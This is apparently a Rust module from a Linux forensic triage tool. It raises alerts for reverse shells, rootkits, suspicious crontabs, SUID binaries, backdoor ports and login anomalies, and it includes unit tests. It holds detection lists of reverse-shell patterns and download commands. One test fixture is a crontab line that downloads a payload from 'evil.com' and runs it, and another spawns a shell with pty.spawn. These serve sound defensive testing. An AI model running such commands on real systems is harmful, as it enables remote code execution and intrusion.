//! Alert detection heuristics for forensic investigation data.
//!
//! Scans parsed UAC artifacts for indicators of compromise — suspicious
//! network connections, processes running from temp directories, rootkit
//! detections, and misconfigured system files.

use rt_mft_tree::tree::FileTree;
use rt_parser_uac::parsers::bodyfile::BodyfileEntry;
use rt_parser_uac::parsers::chkrootkit::ChkrootkitFinding;
use rt_parser_uac::parsers::configs::ConfigFile;
use rt_parser_uac::parsers::hash_execs::HashedExecutable;
use rt_parser_uac::parsers::network::NetworkConnection;
use rt_parser_uac::parsers::packages::InstalledPackage;
use rt_parser_uac::parsers::process::{CrontabEntry, ProcessInfo};
use rt_parser_uac::parsers::rootkit::RootkitFinding;
use rt_parser_uac::parsers::system::LoginRecord;
use rt_signatures::heuristics::AnomalyIndex;
use rt_signatures::matching::results::Severity;

// ---------------------------------------------------------------------------
// Types
// ---------------------------------------------------------------------------

/// Severity level of a forensic alert.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
pub enum AlertSeverity {
    /// Requires immediate attention.
    Critical = 0,
    /// Potentially suspicious, warrants investigation.
    Warning = 1,
    /// Informational finding.
    Info = 2,
}

impl AlertSeverity {
    /// Short prefix label for display.
    #[must_use]
    pub fn label(self) -> &'static str {
        match self {
            Self::Critical => "[!]",
            Self::Warning => "[w]",
            Self::Info => "[i]",
        }
    }
}

/// A single forensic alert raised by heuristic checks.
#[derive(Debug, Clone)]
pub struct Alert {
    pub severity: AlertSeverity,
    pub category: String,
    pub message: String,
    pub detail: String,
}

/// Borrowed slices of parsed artifacts fed into the alert engine.
pub struct AlertInput<'a> {
    pub bodyfile: &'a [BodyfileEntry],
    pub network: &'a [NetworkConnection],
    pub processes: &'a [ProcessInfo],
    pub crontabs: &'a [CrontabEntry],
    pub chkrootkit: &'a [ChkrootkitFinding],
    pub rootkit_findings: &'a [RootkitFinding],
    pub configs: &'a [ConfigFile],
    pub hashes: &'a [HashedExecutable],
    pub packages: &'a [InstalledPackage],
    pub logins: &'a [LoginRecord],
}

// ---------------------------------------------------------------------------
// Main entry point
// ---------------------------------------------------------------------------

/// Run all alert heuristics against the provided artifacts.
///
/// Results are sorted by severity (Critical first, then Warning, then Info).
#[must_use]
pub fn detect_alerts(input: &AlertInput<'_>) -> Vec<Alert> {
    let mut alerts = Vec::new();

    // --- Per-category checks ---
    check_network_alerts(input.network, &mut alerts);
    check_unattributed_connections(input.network, &mut alerts);
    check_suspicious_listeners(input.network, &mut alerts);
    check_process_alerts(input.processes, &mut alerts);
    check_chkrootkit_alerts(input.chkrootkit, &mut alerts);
    check_rootkit_finding_alerts(
        input.rootkit_findings,
        input.bodyfile,
        input.hashes,
        &mut alerts,
    );
    check_config_alerts(input.configs, input.crontabs, &mut alerts);
    check_bodyfile_alerts(input.bodyfile, &mut alerts);
    check_login_anomalies(input.logins, &mut alerts);

    // --- Cross-parser correlation checks ---
    check_process_network_correlation(input.processes, input.network, input.hashes, &mut alerts);
    check_persistence_correlation(input.crontabs, input.bodyfile, &mut alerts);
    check_rootkit_compound_indicators(
        input.rootkit_findings,
        input.network,
        input.crontabs,
        &mut alerts,
    );

    alerts.sort_by_key(|a| a.severity);
    alerts
}

// ---------------------------------------------------------------------------
// Network checks
// ---------------------------------------------------------------------------

/// Flag connections to non-RFC1918 remote addresses.
fn check_network_alerts(connections: &[NetworkConnection], alerts: &mut Vec<Alert>) {
    for conn in connections {
        let addr = conn.remote_addr.as_str();

        // Strip port suffix (1.2.3.4:443 or [::1]:443)
        let ip = addr
            .rsplit_once(':')
            .map_or(addr, |(host, _port)| host)
            .trim_start_matches('[')
            .trim_end_matches(']');

        if ip.is_empty()
            || ip == "*"
            || ip == "0.0.0.0"
            || ip.starts_with("127.")
            || ip.starts_with("10.")
            || ip.starts_with("192.168.")
            || ip == "::"
            || ip == "::1"
        {
            continue;
        }

        if is_rfc1918_172(ip) {
            continue;
        }

        alerts.push(Alert {
            severity: AlertSeverity::Warning,
            category: "network".into(),
            message: format!("External connection to {ip}"),
            detail: format!(
                "local={} remote={} state={}",
                conn.local_addr, conn.remote_addr, conn.state
            ),
        });
    }
}

/// Check whether an IP falls in the 172.16.0.0/12 private range.
#[must_use]
pub fn is_rfc1918_172(ip: &str) -> bool {
    if !ip.starts_with("172.") {
        return false;
    }

    let Some(second_octet_str) = ip.split('.').nth(1) else {
        return false;
    };

    let Ok(second_octet) = second_octet_str.parse::<u8>() else {
        return false;
    };

    (16..=31).contains(&second_octet)
}

// ---------------------------------------------------------------------------
// Process checks
// ---------------------------------------------------------------------------

/// Flag processes running from temp directories and reverse shell patterns.
fn check_process_alerts(processes: &[ProcessInfo], alerts: &mut Vec<Alert>) {
    let temp_prefixes = ["/tmp/", "/dev/shm/", "/var/tmp/"];
    let shell_patterns = ["pty.spawn", "nc -e", "/dev/tcp", "bash -i", "ncat"];

    for proc in processes {
        let cmd = proc.command.as_str();

        // Temp directory execution
        for prefix in &temp_prefixes {
            if cmd.starts_with(prefix) || cmd.contains(&format!(" {prefix}")) {
                alerts.push(Alert {
                    severity: AlertSeverity::Warning,
                    category: "process".into(),
                    message: format!("Process running from {prefix}"),
                    detail: format!("pid={} user={} cmd={}", proc.pid, proc.user, cmd),
                });
                break;
            }
        }

        // Reverse shell patterns
        for pattern in &shell_patterns {
            if cmd.contains(pattern) {
                alerts.push(Alert {
                    severity: AlertSeverity::Critical,
                    category: "process".into(),
                    message: format!("Reverse shell indicator: {pattern}"),
                    detail: format!("pid={} user={} cmd={}", proc.pid, proc.user, cmd),
                });
                break;
            }
        }
    }
}

// ---------------------------------------------------------------------------
// Chkrootkit checks
// ---------------------------------------------------------------------------

/// Flag any chkrootkit finding with INFECTED status.
fn check_chkrootkit_alerts(findings: &[ChkrootkitFinding], alerts: &mut Vec<Alert>) {
    for finding in findings {
        if finding.is_infected {
            alerts.push(Alert {
                severity: AlertSeverity::Critical,
                category: "rootkit".into(),
                message: format!("chkrootkit INFECTED: {}", finding.check_name),
                detail: finding.result.clone(),
            });
        }
    }
}

// ---------------------------------------------------------------------------
// Rootkit finding checks
// ---------------------------------------------------------------------------

/// Convert rootkit indicator findings into alerts with mapped severity.
///
/// Maps `RootkitSeverity` to `AlertSeverity`:
/// - Critical → Critical (known rootkit module, LD_PRELOAD with rootkit lib)
/// - Warning → Warning (unknown ld.so.preload entry, unsigned kernel module)
/// - Info → Info (proprietary module, out-of-tree module)
fn check_rootkit_finding_alerts(
    findings: &[RootkitFinding],
    bodyfile: &[BodyfileEntry],
    hashes: &[HashedExecutable],
    alerts: &mut Vec<Alert>,
) {
    for finding in findings {
        let severity = match finding.severity {
            rt_parser_uac::parsers::rootkit::RootkitSeverity::Critical => AlertSeverity::Critical,
            rt_parser_uac::parsers::rootkit::RootkitSeverity::Warning => AlertSeverity::Warning,
            rt_parser_uac::parsers::rootkit::RootkitSeverity::Info => AlertSeverity::Info,
        };

        let detail = if finding.check == "ld_preload" {
            enrich_ld_preload_detail(&finding.evidence, bodyfile, hashes)
        } else {
            finding.evidence.clone()
        };

        alerts.push(Alert {
            severity,
            category: "rootkit".into(),
            message: format!("[{}] {}", finding.check, finding.description),
            detail,
        });
    }
}

/// Build an enriched detail string for an ld.so.preload finding by
/// cross-referencing the library path against bodyfile and hash data.
fn enrich_ld_preload_detail(
    path: &str,
    bodyfile: &[BodyfileEntry],
    hashes: &[HashedExecutable],
) -> String {
    let mut parts = vec![path.to_string()];

    // Cross-reference against bodyfile for file metadata
    if let Some(entry) = bodyfile.iter().find(|e| e.path == path) {
        parts.push(format!(
            "size={} mode={} uid={} gid={}",
            entry.size, entry.mode, entry.uid, entry.gid
        ));
        if let Some(mtime) = entry.mtime {
            parts.push(format!("mtime={mtime}"));
        }
    } else {
        parts.push("not found in bodyfile".into());
    }

    // Cross-reference against hash executables
    if let Some(entry) = hashes.iter().find(|h| h.path == path) {
        parts.push(format!("{}={}", entry.algorithm, entry.hash));
    }

    parts.join(" | ")
}

// ---------------------------------------------------------------------------
// Unattributed connection checks
// ---------------------------------------------------------------------------

/// Flag active connections (LISTEN/ESTABLISHED) with no process owner.
///
/// When `ss` or `netstat` reports a socket with no PID, it may indicate
/// process hiding by a rootkit (e.g. diamorphine, reptile). Only flags
/// active states (LISTEN, ESTAB, ESTABLISHED) — transient states like
/// CLOSE-WAIT and TIME-WAIT are ignored.
fn check_unattributed_connections(connections: &[NetworkConnection], alerts: &mut Vec<Alert>) {
    let active_states = ["LISTEN", "ESTAB", "ESTABLISHED"];

    for conn in connections {
        if conn.pid.is_some() {
            continue;
        }

        let state_upper = conn.state.to_uppercase();
        if !active_states.iter().any(|s| state_upper.contains(s)) {
            continue;
        }

        alerts.push(Alert {
            severity: AlertSeverity::Warning,
            category: "network".into(),
            message: format!(
                "Unattributed {} connection (no PID — possible process hiding)",
                conn.state
            ),
            detail: format!(
                "proto={} local={} remote={}",
                conn.protocol, conn.local_addr, conn.remote_addr
            ),
        });
    }
}

// ---------------------------------------------------------------------------
// Config checks
// ---------------------------------------------------------------------------

/// Check for suspicious configuration: ld.so.preload and crontab commands.
fn check_config_alerts(configs: &[ConfigFile], crontabs: &[CrontabEntry], alerts: &mut Vec<Alert>) {
    let suspicious_commands = ["wget", "curl", "base64", "nc"];

    // ld.so.preload with content
    for cfg in configs {
        if cfg.path.ends_with("ld.so.preload") && !cfg.content.trim().is_empty() {
            alerts.push(Alert {
                severity: AlertSeverity::Critical,
                category: "config".into(),
                message: "ld.so.preload is non-empty (potential shared-library hijack)".into(),
                detail: cfg.content.lines().next().unwrap_or("").to_string(),
            });
        }
    }

    // Suspicious crontab commands
    for entry in crontabs {
        let cmd_lower = entry.command.to_lowercase();
        for keyword in &suspicious_commands {
            if cmd_lower.contains(keyword) {
                alerts.push(Alert {
                    severity: AlertSeverity::Warning,
                    category: "config".into(),
                    message: format!("Suspicious crontab command ({keyword})"),
                    detail: format!(
                        "schedule={} user={} cmd={}",
                        entry.schedule, entry.user, entry.command
                    ),
                });
                break;
            }
        }
    }
}

// ---------------------------------------------------------------------------
// Bodyfile checks
// ---------------------------------------------------------------------------

/// Standard directories where SUID binaries are expected.
const SUID_SAFE_PREFIXES: &[&str] = &[
    "/usr/bin/",
    "/bin/",
    "/usr/sbin/",
    "/sbin/",
    "/usr/lib/",
    "/usr/libexec/",
];

/// Check bodyfile for executables in temp dirs and unexpected SUID binaries.
fn check_bodyfile_alerts(entries: &[BodyfileEntry], alerts: &mut Vec<Alert>) {
    let temp_prefixes = ["/tmp/", "/dev/shm/", "/var/tmp/"];

    for entry in entries {
        let mode = parse_octal_mode(&entry.mode);

        // Executable in temp directory (mode & 0o111 != 0)
        if mode & 0o111 != 0 {
            for prefix in &temp_prefixes {
                if entry.path.starts_with(prefix) {
                    alerts.push(Alert {
                        severity: AlertSeverity::Warning,
                        category: "filesystem".into(),
                        message: format!("Executable in temp directory: {}", entry.path),
                        detail: format!("mode={} size={}", entry.mode, entry.size),
                    });
                    break;
                }
            }
        }

        // SUID outside standard paths (mode & 0o4000 != 0)
        if mode & 0o4000 != 0 {
            let in_safe_dir = SUID_SAFE_PREFIXES
                .iter()
                .any(|prefix| entry.path.starts_with(prefix));

            if !in_safe_dir {
                alerts.push(Alert {
                    severity: AlertSeverity::Critical,
                    category: "filesystem".into(),
                    message: format!("SUID binary outside standard path: {}", entry.path),
                    detail: format!("mode={} uid={} gid={}", entry.mode, entry.uid, entry.gid),
                });
            }
        }
    }
}

/// Parse an octal mode string (e.g. "100755") into a numeric value.
fn parse_octal_mode(mode_str: &str) -> u32 {
    u32::from_str_radix(mode_str.trim(), 8).unwrap_or(0)
}

// ---------------------------------------------------------------------------
// Login anomaly checks
// ---------------------------------------------------------------------------

/// Detect suspicious login patterns from parsed `last` output.
///
/// Detects:
/// - Root login from a remote host (Critical)
/// - Login source that appears only once across all records (Warning)
fn check_login_anomalies(logins: &[LoginRecord], alerts: &mut Vec<Alert>) {
    // Count occurrences of each non-empty login source
    let mut source_counts: std::collections::HashMap<&str, usize> =
        std::collections::HashMap::new();
    for login in logins {
        let src = login.source.as_str();
        if !src.is_empty() {
            *source_counts.entry(src).or_insert(0) += 1;
        }
    }

    for login in logins {
        let src = login.source.as_str();

        // Root login from remote host (non-empty, non-local source)
        if login.user == "root" && !src.is_empty() && src != "localhost" && !src.starts_with(':') {
            alerts.push(Alert {
                severity: AlertSeverity::Critical,
                category: "auth".into(),
                message: format!("Remote root login from {src}"),
                detail: format!(
                    "user={} terminal={} source={} time={}",
                    login.user,
                    login.terminal,
                    src,
                    login.login_time.as_deref().unwrap_or("unknown")
                ),
            });
        }

        // Unique login source — appears exactly once
        if !src.is_empty() && source_counts.get(src) == Some(&1) && logins.len() > 1 {
            alerts.push(Alert {
                severity: AlertSeverity::Warning,
                category: "auth".into(),
                message: format!("Unique login source: {src} (seen only once)"),
                detail: format!(
                    "user={} terminal={} source={} time={}",
                    login.user,
                    login.terminal,
                    src,
                    login.login_time.as_deref().unwrap_or("unknown")
                ),
            });
        }
    }
}

// ---------------------------------------------------------------------------
// Suspicious listener checks
// ---------------------------------------------------------------------------

/// Known backdoor / pentest tool ports.
const SUSPICIOUS_PORTS: &[u16] = &[
    4444, 5555, 6666, 6667, 7777, 8888, 9999, 1337, 31337, 4445, 3333,
];

/// Flag LISTEN sockets on commonly-used backdoor ports.
fn check_suspicious_listeners(network: &[NetworkConnection], alerts: &mut Vec<Alert>) {
    for conn in network {
        if !conn.state.eq_ignore_ascii_case("LISTEN") {
            continue;
        }

        // Extract port from local_addr (e.g. "0.0.0.0:4444" → 4444)
        let port = conn
            .local_addr
            .rsplit_once(':')
            .and_then(|(_, p)| p.parse::<u16>().ok());

        if let Some(port) = port {
            if SUSPICIOUS_PORTS.contains(&port) {
                alerts.push(Alert {
                    severity: AlertSeverity::Warning,
                    category: "network".into(),
                    message: format!(
                        "Suspicious listener on port {port} (known backdoor/pentest port)"
                    ),
                    detail: format!(
                        "proto={} local={} program={}",
                        conn.protocol,
                        conn.local_addr,
                        conn.program.as_deref().unwrap_or("unknown")
                    ),
                });
            }
        }
    }
}

// ---------------------------------------------------------------------------
// Cross-parser correlation: process × network
// ---------------------------------------------------------------------------

/// Cross-correlate processes with their network connections.
///
/// Detects:
/// - Temp-dir process with active network connection (Critical)
/// - Connection PID not found in process list — hidden process (Warning)
///
/// When a match is found, the alert detail is enriched with the executable
/// hash if available in `hashes`.
fn check_process_network_correlation(
    processes: &[ProcessInfo],
    network: &[NetworkConnection],
    hashes: &[HashedExecutable],
    alerts: &mut Vec<Alert>,
) {
    let temp_prefixes = ["/tmp/", "/dev/shm/", "/var/tmp/"];
    let active_states = ["ESTAB", "LISTEN", "SYN"];

    for conn in network {
        let Some(pid) = conn.pid else { continue };

        let state_upper = conn.state.to_uppercase();
        let is_active = active_states.iter().any(|s| state_upper.contains(s));
        if !is_active {
            continue;
        }

        match processes.iter().find(|p| p.pid == pid) {
            Some(proc) => {
                let cmd = proc.command.as_str();
                // Check if the process executable is in a temp directory
                for prefix in &temp_prefixes {
                    if cmd.starts_with(prefix) || cmd.contains(&format!(" {prefix}")) {
                        let exe_path = cmd.split_whitespace().next().unwrap_or(cmd);
                        let hash_info = hashes
                            .iter()
                            .find(|h| h.path == exe_path)
                            .map(|h| format!(" | {}={}", h.algorithm, h.hash))
                            .unwrap_or_default();

                        alerts.push(Alert {
                            severity: AlertSeverity::Critical,
                            category: "correlation".into(),
                            message: format!(
                                "Temp-dir process with active network connection ({prefix})"
                            ),
                            detail: format!(
                                "pid={pid} cmd={cmd} local={} remote={} state={}{}",
                                conn.local_addr, conn.remote_addr, conn.state, hash_info
                            ),
                        });
                        break;
                    }
                }
            }
            None => {
                // PID from connection not in process list — possible hidden process
                alerts.push(Alert {
                    severity: AlertSeverity::Warning,
                    category: "correlation".into(),
                    message: format!(
                        "Connection PID {pid} not in process list (possible hidden process)"
                    ),
                    detail: format!(
                        "pid={pid} proto={} local={} remote={} state={}",
                        conn.protocol, conn.local_addr, conn.remote_addr, conn.state
                    ),
                });
            }
        }
    }
}

// ---------------------------------------------------------------------------
// Cross-parser correlation: crontab × bodyfile (persistence)
// ---------------------------------------------------------------------------

/// Detect persistence mechanisms by cross-referencing crontabs with bodyfile.
///
/// Detects:
/// - Crontab scheduling execution of a file in a temp directory,
///   enriched with bodyfile metadata when the payload exists on disk (Critical)
/// - Crontab referencing a temp-dir file that is NOT in the bodyfile,
///   suggesting cleanup after deployment (Warning)
fn check_persistence_correlation(
    crontabs: &[CrontabEntry],
    bodyfile: &[BodyfileEntry],
    alerts: &mut Vec<Alert>,
) {
    let temp_prefixes = ["/tmp/", "/dev/shm/", "/var/tmp/"];

    for entry in crontabs {
        // Extract tokens that look like absolute paths in temp directories
        for token in entry.command.split_whitespace() {
            let is_temp_path = temp_prefixes.iter().any(|p| token.starts_with(p));
            if !is_temp_path {
                continue;
            }
            // Strip trailing shell operators (;, &&, |, etc.)
            let path = token.trim_end_matches(|c: char| {
                !c.is_alphanumeric() && c != '/' && c != '.' && c != '_' && c != '-'
            });

            if let Some(bf) = bodyfile.iter().find(|b| b.path == path) {
                alerts.push(Alert {
                    severity: AlertSeverity::Critical,
                    category: "correlation".into(),
                    message: format!("Crontab persistence: scheduled execution of {path}"),
                    detail: format!(
                        "user={} schedule={} | file: size={} mode={} mtime={}",
                        entry.user,
                        entry.schedule,
                        bf.size,
                        bf.mode,
                        bf.mtime.unwrap_or(0)
                    ),
                });
            } else {
                alerts.push(Alert {
                    severity: AlertSeverity::Warning,
                    category: "correlation".into(),
                    message: format!("Crontab references missing temp file: {path}"),
                    detail: format!(
                        "user={} schedule={} cmd={} | file not found in bodyfile",
                        entry.user, entry.schedule, entry.command
                    ),
                });
            }
            break; // Only flag first temp path per crontab entry
        }
    }
}

// ---------------------------------------------------------------------------
// Cross-parser correlation: rootkit compound indicators
// ---------------------------------------------------------------------------

/// Escalate when multiple independent rootkit indicators co-occur.
///
/// Detects:
/// - Rootkit findings + unattributed network listener → compound Critical
/// - Rootkit findings + suspicious crontab → persistence Warning
/// - Rootkit findings spanning 2+ check categories → multi-vector Critical
fn check_rootkit_compound_indicators(
    rootkit_findings: &[RootkitFinding],
    network: &[NetworkConnection],
    crontabs: &[CrontabEntry],
    alerts: &mut Vec<Alert>,
) {
    use rt_parser_uac::parsers::rootkit::RootkitSeverity;

    if rootkit_findings.is_empty() {
        return;
    }

    let has_critical_rootkit = rootkit_findings
        .iter()
        .any(|f| matches!(f.severity, RootkitSeverity::Critical));

    // Compound: rootkit + unattributed network listener
    let unattributed_count = network
        .iter()
        .filter(|c| {
            c.pid.is_none() && {
                let s = c.state.to_uppercase();
                s.contains("LISTEN") || s.contains("ESTAB")
            }
        })
        .count();

    if has_critical_rootkit && unattributed_count > 0 {
        alerts.push(Alert {
            severity: AlertSeverity::Critical,
            category: "correlation".into(),
            message: "Rootkit activity with hidden network listener (compound indicator)".into(),
            detail: format!(
                "critical rootkit findings: {} | unattributed connections: {unattributed_count}",
                rootkit_findings
                    .iter()
                    .filter(|f| matches!(f.severity, RootkitSeverity::Critical))
                    .count(),
            ),
        });
    }

    // Compound: rootkit + suspicious crontab → persistence
    let suspicious_commands = ["wget", "curl", "base64", "nc", "ncat"];
    let has_suspicious_crontab = crontabs.iter().any(|e| {
        let cmd_lower = e.command.to_lowercase();
        suspicious_commands.iter().any(|k| cmd_lower.contains(k))
    });

    if !rootkit_findings.is_empty() && has_suspicious_crontab {
        alerts.push(Alert {
            severity: AlertSeverity::Warning,
            category: "correlation".into(),
            message: "Rootkit indicators with suspicious scheduled task (persistence)".into(),
            detail: format!(
                "rootkit checks: {} | suspicious crontabs: {}",
                rootkit_findings.len(),
                crontabs
                    .iter()
                    .filter(|e| {
                        let cmd_lower = e.command.to_lowercase();
                        suspicious_commands.iter().any(|k| cmd_lower.contains(k))
                    })
                    .count()
            ),
        });
    }

    // Multi-vector: rootkit findings spanning 2+ different check categories
    let check_types: std::collections::HashSet<&str> =
        rootkit_findings.iter().map(|f| f.check.as_str()).collect();
    if check_types.len() >= 2 {
        let mut checks: Vec<&str> = check_types.into_iter().collect();
        checks.sort_unstable();
        alerts.push(Alert {
            severity: AlertSeverity::Critical,
            category: "correlation".into(),
            message: format!(
                "Multi-vector rootkit indicators across {} categories",
                checks.len()
            ),
            detail: format!("affected checks: {}", checks.join(", ")),
        });
    }
}

// ---------------------------------------------------------------------------
// MFT anomaly → alert conversion
// ---------------------------------------------------------------------------

/// Convert MFT heuristic anomalies into workbench alerts.
///
/// Walks all flagged entries in the anomaly index, resolves their file path
/// from the MFT tree, and converts each anomaly into an `Alert` with the
/// appropriate severity mapping.
#[must_use]
pub fn anomalies_to_alerts(index: &AnomalyIndex, tree: &FileTree) -> Vec<Alert> {
    let mut alerts = Vec::new();

    for node_idx in index.flagged_entries() {
        let path = tree.cached_path(node_idx).to_string();
        for anomaly in index.for_node(node_idx) {
            let severity = match anomaly.severity {
                Severity::Critical => AlertSeverity::Critical,
                Severity::High | Severity::Medium => AlertSeverity::Warning,
                Severity::Low | Severity::Informational => AlertSeverity::Info,
            };

            alerts.push(Alert {
                severity,
                category: format!("MFT/{}", anomaly.category),
                message: format!("[{}] {}", anomaly.rule_id, anomaly.description),
                detail: format!("{path}: {}", anomaly.evidence),
            });
        }
    }

    alerts.sort_by_key(|a| a.severity);
    alerts
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;

    fn empty_input() -> AlertInput<'static> {
        AlertInput {
            bodyfile: &[],
            network: &[],
            processes: &[],
            crontabs: &[],
            chkrootkit: &[],
            rootkit_findings: &[],
            configs: &[],
            hashes: &[],
            packages: &[],
            logins: &[],
        }
    }

    #[test]
    fn empty_input_no_alerts() {
        let alerts = detect_alerts(&empty_input());
        assert!(alerts.is_empty());
    }

    #[test]
    fn reverse_shell_detection() {
        let procs = vec![ProcessInfo {
            pid: 999,
            ppid: 1,
            user: "www-data".into(),
            command: "python3 -c import pty; pty.spawn(\"/bin/bash\")".into(),
            cpu_pct: None,
            mem_pct: None,
            start_time: None,
        }];
        let input = AlertInput {
            processes: &procs,
            ..empty_input()
        };
        let alerts = detect_alerts(&input);
        assert!(
            alerts
                .iter()
                .any(|a| a.severity == AlertSeverity::Critical && a.message.contains("pty.spawn")),
            "expected reverse shell alert, got: {alerts:?}"
        );
    }

    #[test]
    fn temp_executable_detection() {
        let entries = vec![BodyfileEntry {
            md5: String::new(),
            path: "/tmp/evil.sh".into(),
            inode: 0,
            mode: "100755".into(),
            uid: 0,
            gid: 0,
            size: 100,
            atime: Some(1_700_000_000),
            mtime: Some(1_700_000_000),
            ctime: Some(1_700_000_000),
            crtime: None,
        }];
        let input = AlertInput {
            bodyfile: &entries,
            ..empty_input()
        };
        let alerts = detect_alerts(&input);
        assert!(
            alerts.iter().any(|a| a.message.contains("/tmp/evil.sh")),
            "expected temp executable alert, got: {alerts:?}"
        );
    }

    #[test]
    fn suid_outside_standard_path() {
        let entries = vec![BodyfileEntry {
            md5: String::new(),
            path: "/home/user/.hidden/backdoor".into(),
            inode: 0,
            mode: "104755".into(), // SUID + executable
            uid: 0,
            gid: 0,
            size: 50_000,
            atime: None,
            mtime: None,
            ctime: None,
            crtime: None,
        }];
        let input = AlertInput {
            bodyfile: &entries,
            ..empty_input()
        };
        let alerts = detect_alerts(&input);
        assert!(
            alerts
                .iter()
                .any(|a| a.severity == AlertSeverity::Critical && a.message.contains("SUID")),
            "expected SUID alert, got: {alerts:?}"
        );
    }

    #[test]
    fn chkrootkit_infected_finding() {
        let findings = vec![ChkrootkitFinding {
            check_name: "bindshell".into(),
            result: "INFECTED".into(),
            is_infected: true,
        }];
        let input = AlertInput {
            chkrootkit: &findings,
            ..empty_input()
        };
        let alerts = detect_alerts(&input);
        assert!(
            alerts
                .iter()
                .any(|a| a.severity == AlertSeverity::Critical && a.message.contains("bindshell")),
            "expected chkrootkit alert, got: {alerts:?}"
        );
    }

    #[test]
    fn ld_so_preload_alert() {
        let configs = vec![ConfigFile {
            path: "etc/ld.so.preload".into(),
            content: "/lib/libevil.so\n".into(),
        }];
        let input = AlertInput {
            configs: &configs,
            ..empty_input()
        };
        let alerts = detect_alerts(&input);
        assert!(
            alerts
                .iter()
                .any(|a| a.severity == AlertSeverity::Critical
                    && a.message.contains("ld.so.preload")),
            "expected ld.so.preload alert, got: {alerts:?}"
        );
    }

    #[test]
    fn suspicious_crontab_wget() {
        let crontabs = vec![CrontabEntry {
            schedule: "*/5 * * * *".into(),
            command: "wget http://evil.com/payload -O /tmp/x && bash /tmp/x".into(),
            user: "root".into(),
        }];
        let input = AlertInput {
            crontabs: &crontabs,
            ..empty_input()
        };
        let alerts = detect_alerts(&input);
        assert!(
            alerts
                .iter()
                .any(|a| a.category == "config" && a.message.contains("wget")),
            "expected crontab alert, got: {alerts:?}"
        );
    }

    #[test]
    fn alerts_sorted_by_severity() {
        // A mix of inputs that should produce Critical + Warning alerts
        let procs = vec![ProcessInfo {
            pid: 1,
            ppid: 0,
            user: "root".into(),
            command: "python3 -c import pty; pty.spawn(\"/bin/sh\")".into(),
            cpu_pct: None,
            mem_pct: None,
            start_time: None,
        }];
        let crontabs = vec![CrontabEntry {
            schedule: "0 * * * *".into(),
            command: "curl http://example.com/update".into(),
            user: "nobody".into(),
        }];
        let input = AlertInput {
            processes: &procs,
            crontabs: &crontabs,
            ..empty_input()
        };
        let alerts = detect_alerts(&input);
        assert!(alerts.len() >= 2);

        // Verify ordering: Critical comes before Warning
        for window in alerts.windows(2) {
            assert!(
                window[0].severity <= window[1].severity,
                "alerts not sorted: {:?} should come before {:?}",
                window[0].severity,
                window[1].severity
            );
        }
    }

    #[test]
    fn is_rfc1918_172_valid() {
        assert!(is_rfc1918_172("172.16.0.1"));
        assert!(is_rfc1918_172("172.31.255.255"));
        assert!(is_rfc1918_172("172.20.10.5"));
    }

    #[test]
    fn anomalies_to_alerts_maps_severity() {
        use rt_signatures::heuristics::anomaly::{Anomaly, AnomalyCategory};

        // Build a minimal MFT tree with one node
        let tree = FileTree::test_single_node("C:\\Windows\\Temp\\evil.exe");

        let mut index = AnomalyIndex::new();
        index.add(
            0,
            Anomaly {
                severity: Severity::Critical,
                category: AnomalyCategory::Timestomping,
                rule_id: "HEUR-TS-001",
                description: "SI/FN timestamp mismatch".into(),
                evidence: "SI modified 2024-01-01, FN modified 2020-01-01".into(),
            },
        );
        index.add(
            0,
            Anomaly {
                severity: Severity::Low,
                category: AnomalyCategory::SuspiciousLocation,
                rule_id: "HEUR-LOC-001",
                description: "Executable in temp directory".into(),
                evidence: "path matches temp pattern".into(),
            },
        );

        let alerts = anomalies_to_alerts(&index, &tree);
        assert_eq!(alerts.len(), 2);

        // Sorted by severity: Critical first, then Info (Low maps to Info)
        assert_eq!(alerts[0].severity, AlertSeverity::Critical);
        assert!(alerts[0].category.starts_with("MFT/"));
        assert!(alerts[0].message.contains("HEUR-TS-001"));
        assert_eq!(alerts[1].severity, AlertSeverity::Info);
    }

    #[test]
    fn anomalies_to_alerts_empty_index() {
        let tree = FileTree::test_single_node("C:\\test.txt");
        let index = AnomalyIndex::new();
        let alerts = anomalies_to_alerts(&index, &tree);
        assert!(alerts.is_empty());
    }

    #[test]
    fn is_rfc1918_172_invalid() {
        assert!(!is_rfc1918_172("172.15.0.1"));
        assert!(!is_rfc1918_172("172.32.0.1"));
        assert!(!is_rfc1918_172("10.0.0.1"));
        assert!(!is_rfc1918_172("192.168.1.1"));
        assert!(!is_rfc1918_172("8.8.8.8"));
        assert!(!is_rfc1918_172(""));
    }

    // =====================================================================
    // Rootkit finding → alert conversion
    // =====================================================================

    #[test]
    fn rootkit_critical_finding_maps_to_critical_alert() {
        use rt_parser_uac::parsers::rootkit::RootkitSeverity;
        let findings = vec![RootkitFinding {
            severity: RootkitSeverity::Critical,
            check: "kernel_module".into(),
            description: "Known rootkit kernel module 'diamorphine' loaded".into(),
            evidence: "diamorphine".into(),
        }];
        let input = AlertInput {
            rootkit_findings: &findings,
            ..empty_input()
        };
        let alerts = detect_alerts(&input);
        assert!(
            alerts.iter().any(|a| a.severity == AlertSeverity::Critical
                && a.category == "rootkit"
                && a.message.contains("diamorphine")),
            "expected critical rootkit alert, got: {alerts:?}"
        );
    }

    #[test]
    fn rootkit_warning_finding_maps_to_warning_alert() {
        use rt_parser_uac::parsers::rootkit::RootkitSeverity;
        let findings = vec![RootkitFinding {
            severity: RootkitSeverity::Warning,
            check: "ld_preload".into(),
            description: "Library found in ld.so.preload".into(),
            evidence: "/lib/libymv.so.3".into(),
        }];
        let input = AlertInput {
            rootkit_findings: &findings,
            ..empty_input()
        };
        let alerts = detect_alerts(&input);
        assert!(
            alerts
                .iter()
                .any(|a| a.severity == AlertSeverity::Warning && a.category == "rootkit"),
            "expected warning rootkit alert, got: {alerts:?}"
        );
    }

    #[test]
    fn rootkit_info_finding_maps_to_info_alert() {
        use rt_parser_uac::parsers::rootkit::RootkitSeverity;
        let findings = vec![RootkitFinding {
            severity: RootkitSeverity::Info,
            check: "kernel_taint".into(),
            description: "Proprietary kernel module loaded".into(),
            evidence: "taint=1, bit 0 set".into(),
        }];
        let input = AlertInput {
            rootkit_findings: &findings,
            ..empty_input()
        };
        let alerts = detect_alerts(&input);
        assert!(
            alerts
                .iter()
                .any(|a| a.severity == AlertSeverity::Info && a.category == "rootkit"),
            "expected info rootkit alert, got: {alerts:?}"
        );
    }

    #[test]
    fn rootkit_empty_findings_no_alerts() {
        let input = AlertInput {
            rootkit_findings: &[],
            ..empty_input()
        };
        let alerts = detect_alerts(&input);
        // Only rootkit-related — with empty input everywhere, should be empty
        assert!(alerts.is_empty());
    }

    #[test]
